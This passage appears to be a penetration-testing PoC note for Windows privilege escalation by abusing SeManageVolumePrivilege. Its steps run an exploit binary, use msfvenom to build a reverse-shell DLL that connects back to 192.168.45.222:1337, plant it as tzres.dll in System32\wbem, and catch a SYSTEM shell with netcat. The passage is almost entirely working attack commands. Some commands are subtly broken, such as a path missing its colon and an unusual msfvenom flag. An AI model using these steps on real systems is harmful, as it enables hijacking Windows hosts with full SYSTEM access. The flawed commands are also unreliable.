
doesn't have to be enabled to work.

---

## PoC

1. Step: Download it onto the system and activate it.

```
SeManageVolumExploit.exe
```

2. Now we should have write access to the whole drive, we can therefore hijack an .dll file (tzres.dll) and replace it with an reverse shell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.222 LPORT=1337 -f dll -d tzres.dll
```

3. Download the .dll file onto the target and move it into the default directory C:\Windows\System32\wbem\

```
move tzres.dll C\Windows\System32\wbem\
```

4. Start up listener. It should automatically be processed and we should get an SYSTEM Shell.

```
nc -lvnp 1337
```